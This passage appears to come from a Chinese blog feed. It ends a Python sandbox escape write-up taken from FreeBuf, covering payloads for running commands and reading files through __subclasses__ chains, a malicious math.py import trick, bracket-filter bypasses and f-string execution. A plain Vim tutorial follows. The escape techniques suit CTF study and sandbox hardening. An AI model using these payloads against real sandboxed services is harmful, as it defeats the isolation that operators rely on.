class="hljs-string">&#x27;xxx\n&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>file(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>).write(<span class="hljs-string">&#x27;xxx&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>file(<span class="hljs-string">&#x27;key&#x27;</span>).read()<br><span class="hljs-string">&#x27;xxx&#x27;</span><br></code></pre></td></tr></table></figure><p>还有个 <code>open</code>，2.x 与 3.x 通用。</p><p>还有一些库，例如：<code>types.FileType</code>(rw)、<code>platform.popen</code>(rw)、<code>linecache.getlines</code>®。</p><p>为什么说写比读危害大呢？因为如果能写，可以将类似的文件保存为<code>math.py</code>，然后 import 进来：</p><p><a href="http://math.py">math.py</a>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-built_in">print</span>(os.system(<span class="hljs-string">&#x27;whoami&#x27;</span>))<br></code></pre></td></tr></table></figure><p>调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> math<br></code></pre></td></tr></table></figure><p>这里需要注意的是，这里 py 文件命名是有技巧的。之所以要挑一个常用的标准库是因为过滤库名可能采用的是白名单。并且之前说过有些库是在<code>sys.modules</code>中有的，这些库无法这样利用，会直接从<code>sys.modules</code>中加入，比如<code>re</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;re&#x27;</span> <span class="hljs-keyword">in</span> sys.modules<br><span class="hljs-literal">True</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;math&#x27;</span> <span class="hljs-keyword">in</span> sys.modules<br><span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure><p>当然在<code>import re</code> 之前<code>del sys.modules['re']</code>也不是不可以…</p><p>最后，这里的文件命名需要注意的地方和最开始的那个遍历测试的文件一样：由于待测试的库中有个叫 <code>test</code>的，如果把遍历测试的文件也命名为 test，会导致那个文件运行 2 次，因为自己 import 了自己。</p><p>读文件暂时没什么发现特别的地方。</p><p>剩下的就是根据上面的执行系统命令采用的绕过方法去寻找 payload 了，比如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">__builtins__.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;key&#x27;</span>).read()<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">()<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__base__</span><span class="hljs-selector-class">.__subclasses__</span>()<span class="hljs-selector-attr">[40]</span>(&#x27;key&#x27;)<span class="hljs-selector-class">.read</span>()<br></code></pre></td></tr></table></figure><h2 id="其他">其他</h2><p>过滤<code>[</code>、<code>]</code>：这个行为不像是 oj 会做得出来的，ctf 倒是有可能出现。应对的方式就是将<code>[]</code>的功能用<code>pop</code> 、<code>__getitem__</code> 代替（实际上<code>a[0]</code>就是在内部调用了<code>a.__getitem__(0)</code> ）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="hljs-number">2</span>).__subclasses__().pop(<span class="hljs-number">59</span>).__init__.func_globals.get(<span class="hljs-string">&#x27;linecache&#x27;</span>).os.popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()<br></code></pre></td></tr></table></figure><p>利用新特性：PEP 498 引入了 <code>f-string</code>，在 3.6 开始出现：<a href="https://docs.python.org/3.6/whatsnew/3.6.html#new-features">传送门</a>，食用方式：<a href="https://docs.python.org/3.6/reference/lexical_analysis.html#f-strings">传送门</a>。所以我们就有了一种船新的利用方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).system(<span class="hljs-string">&quot;whoami&quot;</span>)&#125;</span>&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p>文章来自于： <a href="https://www.freebuf.com/articles/system/203208.html">https://www.freebuf.com/articles/system/203208.html</a><br>感谢师傅： Macr0phag3</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Misc</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Vim 学习使用</title>
    <link href="/2022/03/14/Vim%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/03/14/Vim%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="Vim-模式介绍">Vim 模式介绍</h2><p>Vim 具有 6 种基本模式和 5 种派生模式，这里只简单介绍下 6 种基本模式：</p><ul><li>普通模式(Normal mode)</li></ul><p>在普通模式中，用的编辑器命令，比如移动光标，删除文本等等。这也是 Vim 启动后的默认模式。这正好和许多新用户期待的操作方式相反（大多数编辑器默认模式为插入模式）。</p><blockquote><p>Vim 强大的编辑功能来自于其普通模式命令。普通模式命令往往需要一个操作符结尾。例如普通模式命令<code>dd</code>删除当前行，但是第一个&quot;d&quot;的后面可以跟另外的移动命令来代替第二个<code>d</code>，比如用移动到下一行的&quot;j&quot;键就可以删除当前行和下一行。另外还可以指定命令重复次数，<code>2dd</code>（重复<code>dd</code>两次），和<code>dj</code>的效果是一样的。用户学习了各种各样的文本间移动／跳转的命令和其他的普通模式的编辑命令，并且能够灵活组合使用的话，能够比那些没有模式的编辑器更加高效地进行文本编辑。</p></blockquote><p>在普通模式中，有很多方法可以进入插入模式。比较普通的方式是按 <code>a</code>（append／追加）键或者 <code>i</code>（insert／插入）键。</p><ul><li>插入模式(Insert mode)</li></ul><p>在这个模式中，大多数按键都会向文本缓冲中插入文本。大多数新用户希望文本编辑器编辑过程中一直保持这个模式。</p><blockquote><p>在插入模式中，可以按 <code>ESC</code> 键回到普通模式。</p></blockquote><ul><li>可视模式(Visual mode)</li></ul><blockquote><p>这个模式与普通模式比较相似。但是移动命令会扩大高亮的文本区域。高亮区域可以是字符、行或者是一块文本。当执行一个非移动命令时，命令会被执行到这块高亮的区域上。Vim 的&quot;文本对象&quot;也能和移动命令一样用在这个模式中。</p></blockquote><ul><li>选择模式(Select mode)</li></ul><blockquote><p>这个模式和无模式编辑器的行为比较相似（Windows 标准文本控件的方式）。这个模式中，可以用鼠标或者光标键高亮选择文本，不过输入任何字符的话，Vim 会用这个字符替换选择的高亮文本块，并且自动进入插入模式。</p></blockquote><ul><li>命令行模式(Command line mode)</li></ul><blockquote><p>在命令行模式中可以输入会被解释成并执行的文本。例如执行命令（<code>:</code>键），搜索（<code>/</code>和<code>?</code>键）或者过滤命令（<code>!</code>键）。在命令执行之后，Vim 返回到命令行模式之前的模式，通常是普通模式。</p></blockquote><ul><li>Ex 模式(Ex mode)</li></ul><p>这和命令行模式比较相似，在使用 <code>:visual</code> 命令离开 Ex 模式前，可以一次执行多条命令。</p><h2 id="Vim-三种模式">Vim 三种模式</h2><h3 id="模式的切换">模式的切换</h3><p>vim 启动进入普通模式，处于插入模式或命令行模式时只需要按 <code>Esc</code> 或者 <code>Ctrl+[</code>（这个在 vim 课程环境中可能会不管用）即可进入普通模式。普通模式中按 <code>i</code>（插入）或 <code>a</code>（附加）键都可以进入插入模式，普通模式中按 <code>:</code> 进入命令行模式。命令行模式中输入 <code>wq</code> 回车后保存并退出 vim。</p><h3 id="使用-vim-命令进入-vim-界面">使用 vim 命令进入 vim 界面</h3><p>vim 后面加上你要打开的已存在的文件名或者不存在（则作为新建文件）的文件名。在环境里输入下面的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim practice_1.txt<br></code></pre></td></tr></table></figure><p>直接使用 vim 也可以打开 vim 编辑器，但是不会打开任何文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim<br></code></pre></td></tr></table></figure><p>进入命令行模式后输入 <code>:e &lt;filepath&gt;</code> 同样可以打开相应文件。</p><h3 id="游标移动">游标移动</h3><p>在进入 vim 后，按下 <code>i</code> 键进入插入模式。在该模式下您可以输入文本信息,下面请输入如下三行信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">12345678<br>abcdefghijk<br>shiyanlou.com<br></code></pre></td></tr></table></figure><p>按<code>Esc</code>进入普通模式，在该模式下使用方向键或者 <code>h</code>，<code>j</code>，<code>k</code>，<code>l</code> 键可以移动游标。</p><table><thead><tr><th>按键</th><th>说明</th></tr></thead><tbody><tr><td><code>h</code></td><td>左</td></tr><tr><td><code>l</code></td><td>右（小写 L）</td></tr><tr><td><code>j</code></td><td>下</td></tr><tr><td><code>k</code></td><td>上</td></tr><tr><td><code>w</code></td><td>移动到下一个单词</td></tr><tr><td><code>b</code></td><td>移动到上一个单词</td></tr></tbody></table><h3 id="进入插入模式">进入插入模式</h3><p>在普通模式下使用下面的键将进入插入模式，并可以从相应的位置开始输入</p><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td><code>i</code></td><td>在当前光标处进行编辑</td></tr><tr><td><code>I</code></td><td>在行首插入</td></tr><tr><td><code>A</code></td><td>在行末插入</td></tr><tr><td><code>a</code></td><td>在光标后插入编辑</td></tr><tr><td><code>o</code></td><td>在当前行后插入一个新行</td></tr><tr><td><code>O</code></td><td>在当前行前插入一个新行</td></tr><tr><td><code>cw</code></td><td>替换从光标所在位置后到一个单词结尾的字符</td></tr></tbody></table><p>请尝试不同的从普通模式进入插入模式的方法，在最后一行 shiyanlou 前面加上 <code>www.</code>，<strong>注意每次要先回到普通模式才能切换成以不同的方式进入插入模式。</strong></p><h3 id="命令行模式下保存文档">命令行模式下保存文档</h3><p>从普通模式输入 <code>:</code> 进入命令行模式，输入 <code>w</code> 回车，保存文档。输入 <code>:w &lt;filename&gt;</code> 可以将文档另存为其他文件名或存到其它路径下。</p><h3 id="命令行模式下退出-vim">命令行模式下退出 vim</h3><p>从普通模式输入 <code>:</code> 进入命令行模式，输入 <code>wq</code> 回车，保存并退出编辑。</p><p>以下为其它几种退出方式：</p><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td><code>:q!</code></td><td>强制退出，不保存</td></tr><tr><td><code>:q</code></td><td>退出</td></tr><tr><td><code>:wq!</code></td><td>强制保存并退出</td></tr><tr><td><code>:w &lt;文件路径&gt;</code></td><td>另存为</td></tr><tr><td><code>:saveas 文件路径</code></td><td>另存为</td></tr><tr><td><code>:x</code></td><td>保存并退出</td></tr><tr><td><code>:wq</code></td><td>保存并退出</td></tr></tbody></table><h3 id="普通模式下退出-vim">普通模式下退出 vim</h3><p>普通模式下按下 <code>Shift+zz</code> 即可保存退出 vim。</p><h3 id="普通模式下删除-vim-文本信息">普通模式下删除 vim 文本信息</h3><p>进入普通模式，使用下列命令可以进行文本快速删除：</p><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td><code>x</code></td><td>删除游标所在的字符</td></tr><tr><td><code>X</code></td><td>删除游标所在前一个字符</td></tr><tr><td><code>Delete</code></td><td>同 <code>x</code></td></tr><tr><td><code>dd</code></td><td>删除整行</td></tr><tr><td><code>dw</code></td><td>删除一个单词（不适用中文）</td></tr><tr><td><code>d$</code>或<code>D</code></td><td>删除至行尾</td></tr><tr><td><code>d^</code></td><td>删除至行首</td></tr><tr><td><code>dG</code></td><td>删除到文档结尾处</td></tr><tr><td><code>d1G</code></td><td>删至文档首部</td></tr></tbody></table><p>除此之外，你还可以在命令之前加上数字，表示一次删除多行，如：</p><p><code>2dd</code> 表示一次删除 2 行。</p><h2 id="Vim-重复命令">Vim 重复命令</h2><h3 id="重复执行上次命令">重复执行上次命令</h3><p>在普通模式下 <code>.</code>(小数点)表示重复上一次的命令操作。</p><p>拷贝测试文件到本地目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /home/shiyanlou<br>cp /etc/protocols .<br></code></pre></td></tr></table></figure><p>打开文件进行编辑</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim protocols<br></code></pre></td></tr></table></figure><p>普通模式下输入 <code>x</code>，删除第一个字符，输入 <code>.</code>(小数点)会再次删除一个字符，除此之外也可以重复 <code>dd</code> 的删除操作。</p><h3 id="执行指定次数相同的命令">执行指定次数相同的命令</h3><p>进入普通模式输入 <code>N&lt;command&gt;</code>，N 表示重复后面的次数，下面来练习：</p><p>打开文件文件进行编辑</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim protocols<br></code></pre></td></tr></table></figure><p>输入 <code>10x</code>，删除 10 个连续字符<br>输入 <code>3dd</code>，将会删除 3 行文本</p><p>在普通模式下，你还可以使用 <code>dw</code> 或者 <code>daw</code>(delete a word)删除一个单词，所以你可以很容易的联想到 <code>dnw</code>(<strong>n 替换为相应数字</strong>) 表示删除 n 个单词。</p><p>普通模式下，下列命令可以让光标快速调转到指定位置，我们分别讨论快速实现<strong>行间</strong>跳转和<strong>行内</strong>跳转。</p><h2 id="游标快速跳转">游标快速跳转</h2><h3 id="行间跳转">行间跳转</h3><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td><code>nG</code>(n Shift+g) / <code>ngg</code></td><td>游标移动到第 n 行 <strong>(如果默认没有显示行号，请先进入命令模式，输入 <code>:set nu</code> 以显示行号)</strong></td></tr><tr><td><code>gg</code></td><td>游标移动到到第一行</td></tr><tr><td><code>G</code>(Shift+g)</td><td>到最后一行</td></tr></tbody></table><h3 id="行内跳转">行内跳转</h3><p>普通模式下使用下列命令在行内按照单词为单位进行跳转：</p><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td><code>w</code></td><td>到下一个单词的开头</td></tr><tr><td><code>e</code></td><td>到当前单词的结尾</td></tr><tr><td><code>b</code></td><td>到前一个单词的开头</td></tr><tr><td><code>ge</code></td><td>到前一个单词的结尾</td></tr><tr><td><code>0</code>或<code>^</code></td><td>到行头</td></tr><tr><td><code>$</code></td><td>到行尾</td></tr><tr><td><code>f&lt;字母&gt;</code></td><td>向后搜索&lt;字母&gt;并跳转到第一个匹配的位置(非常实用)</td></tr><tr><td><code>F&lt;字母&gt;</code></td><td>向前搜索&lt;字母&gt;并跳转到第一个匹配的位置</td></tr><tr><td><code>t&lt;字母&gt;</code></td><td>向后搜索&lt;字母&gt;并跳转到第一个匹配位置之前的一个字母(不常用)</td></tr><tr><td><code>T&lt;字母&gt;</code></td><td>向前搜索&lt;字母&gt;并跳转到第一个匹配位置之后的一个字母(不常用)</td></tr></tbody></table><h2 id="复制粘贴">复制粘贴</h2><h3 id="复制及粘贴文本">复制及粘贴文本</h3><ul><li>普通模式中使用 <code>y</code> 复制</li><li>普通模式中，<code>yy</code> 复制游标所在的整行（<code>3yy</code> 表示复制 3 行）</li><li>普通模式中，<code>y^</code> 复制至行首，或 <code>y0</code>。不含光标所在处字符。</li><li>普通模式中，<code>y$</code> 复制至行尾。含光标所在处字符。</li><li>普通模式中，<code>yw</code> 复制一个单词。</li><li>普通模式中，<code>y2w</code> 复制两个单词。</li><li>普通模式中，<code>yG</code> 复制至文本末。</li><li>普通模式中，<code>y1G</code> 复制至文本开头。</li><li>普通模式中使用 <code>p</code> 粘贴</li><li>普通模式中，<code>p</code>(小写)代表粘贴至光标后（下）</li><li>普通模式中，<code>P</code>(大写)代表粘贴至光标前（上）</li></ul><h3 id="剪切及粘贴">剪切及粘贴</h3><p>其实前面讲得 <code>dd</code> 删除命令就是剪切，你每次 <code>dd</code> 删除文档内容后，便可以使用 <code>p</code> 来粘贴，也这一点可以让我们实现一个很爽快的功能——交换上下行。</p><p><code>ddp</code>即实现了快速交换光标所在行与它下面的行。</p><h2 id="字符的替换及撤销-Undo-操作">字符的替换及撤销(Undo 操作)</h2><h3 id="替换和撤销-Undo-命令">替换和撤销(Undo)命令</h3><p>替换和 Undo 命令都是针对普通模式下的操作：</p><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td><code>r</code>+&lt;待替换字母&gt;</td><td>将游标所在字母替换为指定字母</td></tr><tr><td><code>R</code></td><td>连续替换，直到按下 <code>Esc</code></td></tr><tr><td><code>cc</code></td><td>替换整行，即删除游标所在行，并进入插入模式</td></tr><tr><td><code>cw</code></td><td>替换一个单词，即删除一个单词，并进入插入模式</td></tr><tr><td><code>C</code>(大写)</td><td>替换游标以后至行末</td></tr><tr><td><code>~</code></td><td>反转游标所在字母大小写</td></tr><tr><td><code>&#123;n&#125;u</code></td><td>撤销一次或 n 次操作</td></tr><tr><td><code>U</code>(大写)</td><td>撤销当前行的所有修改</td></tr><tr><td><code>Ctrl+r</code></td><td>redo，即撤销 undo 的操作</td></tr></tbody></table><h2 id="快速缩进">快速缩进</h2><h3 id="使用命令进行快速调整缩进操作">使用命令进行快速调整缩进操作</h3><ul><li>普通模式下输入 <code>&gt;&gt;</code> 整行将向右缩进</li><li>普通模式下输入 <code>&lt;&lt;</code> 整行向左回退</li><li>普通模式下输入 <code>:</code> 进入命令行模式下对 <code>shiftwidth</code> 值进行设置可以控制缩进和回退的字符数</li></ul><h3 id="shiftwidth-命令">shiftwidth 命令</h3><p><code>shiftwidth</code> 命令是指上一节 <code>&gt;&gt;</code> 命令产生的缩进（可以简写成<code>sw</code>），普通模式下输入 <code>:</code> 进入命令行模式下对 <code>shiftwidth</code> 值进行设置可以控制缩进和回退的字符数。</p><p>获取目前的设定值：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">:<span class="hljs-built_in">set</span> shiftwidth?<br></code></pre></td></tr></table></figure><p>设置缩进为 10 个字符：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">:<span class="hljs-built_in">set</span> shiftwidth=10<br></code></pre></td></tr></table></figure><h3 id="调整文本位置">调整文本位置</h3><p>命令行模式下输入 <code>:ce</code>(center)命令使本行内容居中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">:ce<br></code></pre></td></tr></table></figure><p>命令行模式下输入 <code>:ri</code>(right)命令使本行文本靠右：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">:ri<br></code></pre></td></tr></table></figure><p>命令行模式下输入 <code>le</code>(left)命令使本行内容靠左：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">:le<br></code></pre></td></tr></table></figure><h2 id="查找">查找</h2><h3 id="快速查找">快速查找</h3><p>普通模式下输入 <code>/</code> 然后键入需要查找的字符串，按回车后就会进行查找。<code>?</code> 与<code>/</code> 功能相同，只不过 <code>?</code> 是向上而 <code>/</code> 是向下查找。</p><p>进入查找之后，输入 <code>n</code> 和 <code>N</code> 可以继续查找。<code>n</code> 是查找下一个内容，<code>N</code> 查找上一个内容。</p><h3 id="高级查找">高级查找</h3><ul><li>普通模式下输入 <code>\*</code> 寻找游标所在处的单词</li><li>普通模式下输入 <code>\#</code> 同上，但 <code>\#</code> 是向前（上）找，<code>\*</code> 则是向后（下）找</li><li>普通模式下输入 <code>g\*</code> 同 <code>\*</code>，但部分符合该单词即可</li><li>普通模式下输入 <code>g\#</code> 同 <code>\#</code>，但部分符合该单词即可</li></ul><h2 id="多文件编辑">多文件编辑</h2><h3 id="使用-vim-编辑多个文件">使用 vim 编辑多个文件</h3><p>编辑多个文件有两种形式，一种是在进入 vim 前使用的参数就是多个文件。另一种就是进入 vim 后再编辑其他的文件。 同时创建两个新文件并编辑</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim 1.txt 2.txt<br></code></pre></td></tr></table></figure><p>默认进入<code>1.txt</code>文件的编辑界面</p><ul><li>命令行模式下输入 <code>:n</code> 编辑 2.txt 文件，可以加 <code>!</code> 即 <code>:n!</code> 强制切换，之前一个文件的输入没有保存，仅仅切换到另一个文件</li><li>命令行模式下输入 <code>:N</code> 编辑 1.txt 文件，可以加 <code>!</code> 即 <code>:N!</code> 强制切换，之前文件内的输入没有保存，仅仅是切换到另一个文件</li></ul><h3 id="进入-vim-后打开新文件">进入 vim 后打开新文件</h3><ul><li>命令行模式下输入<code>:e 3.txt</code> 打开新文件 3.txt</li><li>命令行模式下输入<code>:e#</code> 回到前一个文件</li><li>命令行模式下输入<code>:ls</code>可以列出以前编辑过的文档</li><li>命令行模式下输入<code>:b 2.txt</code>（或者编号）可以直接进入文件 2.txt 编辑</li><li>命令行模式下输入<code>:bd 2.txt</code>（或者编号）可以删除以前编辑过的列表中的文件项目</li><li>命令行模式下输入<code>:e! 4.txt</code>，新打开文件 4.txt，放弃正在编辑的文件</li><li>命令行模式下输入<code>:f</code> 显示正在编辑的文件名</li><li>命令行模式下输入<code>:f new.txt</code>，改变正在编辑的文件名字为 new.txt</li></ul><h3 id="恢复文件">恢复文件</h3><p>如果因为断电，终端意外关闭等原因造成文档没有保存，可以采用恢复方式。</p><p>vim 在编辑的时候会自动在当前文件目录下生成一个交换文件，一般以 <code>&lt;filename&gt;.swp</code> 的格式保存，如果有多个版本的交换文件，还可能是 <code>.swn</code>，<code>.swm</code> 等字母。注意这个交换文件的更新不是实时的，因为实时的更新会占用磁盘，影响系统其他正常进程的速度。</p><p>当 vim 意外终止且没有保存已编辑的内容时，可以使用交换文件对文件进行恢复，注意需要在编辑这个文件的地方进行编辑，因为交换文件默认在编辑的目录生成。</p><p>例如假设 <code>1.txt</code> 意外关闭，我们可以输入 <code>vim</code> 然后输入 <code>:recover 1.txt</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim<br>:recover 1.txt<br><br><span class="hljs-comment"># 出现如下提示按下回车即可恢复，如果有多个版本需要输入对应的交换文件前的数字选择要恢复的版本。</span><br>Using swap file <span class="hljs-string">&quot;.1.txt.swp&quot;</span><br>Original file <span class="hljs-string">&quot;~/test/1.txt&quot;</span><br>Recovery completed. You should check <span class="hljs-keyword">if</span> everything is OK.<br>(You might want to write out this file under another name<br>and run diff with the original file to check <span class="hljs-keyword">for</span> changes)<br>You may want to delete the .swp file now.<br></code></pre></td></tr></table></figure><p>或者输入 <code>vim -r</code> 后直接选择用于恢复的文档的交换文件即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim -r 1.txt<br></code></pre></td></tr></table></figure><h2 id="可视模式">可视模式</h2><h3 id="可视模式命令简介">可视模式命令简介</h3><ul><li>在普通模式下输入 <code>v</code>（小写），进入字符选择模式，就可以移动光标，光标走过的地方就会选取。再次按下 v 后就会取消选取。</li><li>在普通模式下输入 <code>Shift+v</code>（小写），进入行选择模式，按下 V 之后就会把整行选取，您可以上下移动光标选更多的行，同样，再按一次 <code>Shift+v</code> 就可以取消选取。</li><li>在普通模式下输入 <code>Ctrl+v</code>（小写），这是区域选择模式，可以进行矩形区域选择，再按一次 <code>Ctrl+v</code> 取消选取。</li><li>在可视模式下输入 <code>d</code> 删除选取区域内容</li><li>在可视模式下输入 <code>y</code> 复制选取区域内容</li></ul><h2 id="视窗操作">视窗操作</h2><h3 id="视窗操作简介">视窗操作简介</h3><p>vim 可以在一个界面里打开多个窗口进行编辑，这些编辑窗口称为 vim 的视窗。 打开方法有很多种，例如可以使用在命令行模式下输入 <code>:new</code> 打开一个新的 vim 视窗，并进入视窗编辑一个新文件（普通模式下输入 <code>Ctrl+w</code> 也可以），除了 <code>:new</code> 命令，下述列举的多种方法也可以在命令模式或普通模式下打开新的视窗：</p><ul><li>命令行模式下输入 <code>:sp 1.txt</code> 打开新的水平分屏视窗来编辑 1.txt</li><li>命令行模式下输入 <code>:vsp 2.txt</code> 打开新的垂直分屏视窗来编辑 2.txt</li><li>普通模式下 <code>Ctrl+w s</code> 将当前窗口分割成两个水平的窗口</li><li>普通模式下 <code>Ctrl+w v</code> 将当前窗口分割成两个垂直的窗口</li><li>普通模式下 <code>Ctrl+w q</code> 即 :q 结束分割出来的视窗。如果在新视窗中有输入需要使用强制符！即:q!</li><li>普通模式下 <code>Ctrl+w o</code> 打开一个视窗并且隐藏之前的所有视窗</li><li>普通模式下 <code>Ctrl+w j</code> 移至下面视窗</li><li>普通模式下 <code>Ctrl+w k</code> 移至上面视窗</li><li>普通模式下 <code>Ctrl+w h</code> 移至左边视窗</li><li>普通模式下 <code>Ctrl+w l</code> 移至右边视窗</li><li>普通模式下 <code>Ctrl+w J</code> 将当前视窗移至下面</li><li>普通模式下 <code>Ctrl+w K</code> 将当前视窗移至上面</li><li>普通模式下 <code>Ctrl+w H</code> 将当前视窗移至左边</li><li>普通模式下 <code>Ctrl+w L</code> 将当前视窗移至右边</li><li>普通模式下 <code>Ctrl+w -</code> 减小视窗的高度</li><li>普通模式下 <code>Ctrl+w +</code> 增加视窗的高度</li></ul><h2 id="文档加密">文档加密</h2><h3 id="创建加密文档">创建加密文档</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim -x file1<br></code></pre></td></tr></table></figure><p>输入您的密码，确认密码，这样在下一次打开时，vim 就会要求你输入密码。</p><h2 id="在-vim-执行外部命令">在 vim 执行外部命令</h2><p>在命令行模式中输入 <code>!</code> 可以执行外部的 shell 命令。</p><ul><li><code>:!ls</code> 用于显示当前目录的内容</li><li><code>:!rm FILENAME</code> 用于删除名为 FILENAME 的文件</li><li><code>:w FILENAME</code> 可将当前 VIM 中正在编辑的文件另存为 FILENAME 文件</li></ul><h2 id="帮助系统">帮助系统</h2><h3 id="vim-中的查看帮助">vim 中的查看帮助</h3><ul><li>普通模式下按 <code>F1</code> 打开 <code>vim</code> 自己预设的帮助文档</li><li>命令行模式下输入 <code>:h shiftwidth</code> 打开名为 <code>shiftwidth</code> 的帮助文件</li><li>命令行模式下输入 <code>:ver</code> 显示版本及参数</li></ul><h2 id="功能设定">功能设定</h2><h3 id="vim-的功能设定">vim 的功能设定</h3><p>可以在编辑文件的时候进行功能设定，如命令行模式下输入 <code>:set nu</code>（显示行数），设定值退出 vim 后不会保存。要永久保存配置需要修改 vim 配置文件。</p><p>vim 的配置文件 <code>~/.vimrc</code>（实验楼环境中配置文件在 <code>/etc/vim/vimrc</code>），可以打开文件进行修改，不过务必小心不要影响 vim 正常使用。</p><h3 id="获取目前的设定">获取目前的设定</h3><ul><li>命令行模式下输入 <code>:set</code> 或者 <code>:se</code> 显示所有修改过的配置</li><li>命令行模式下输入 <code>:set all</code> 显示所有的设定值</li><li>命令行模式下输入 <code>:set &lt;option&gt;?</code> 显示 option 的设定值</li><li>命令行模式下输入 <code>:set nooption</code> 取消当前设定值</li></ul><h3 id="set-功能的说明">set 功能的说明</h3><ul><li>命令行模式下输入 <code>:set autoindent(ai)</code> 设置自动缩进</li><li>命令行模式下输入 <code>:set autowrite(aw)</code> 设置自动存档，默认未打开</li><li>命令行模式下输入 <code>:set background=dark</code> 或 <code>light</code>，设置背景风格</li><li>命令行模式下输入 <code>:set backup(bk)</code> 设置自动备份，默认未打开</li><li>命令行模式下输入 <code>: set cindent(cin)</code> 设置 C 语言风格缩进</li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux Study</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux 手册</title>
    <link href="/2022/03/14/Linux%20%E6%89%8B%E5%86%8C/"/>
    <url>/2022/03/14/Linux%20%E6%89%8B%E5%86%8C/</url>
    
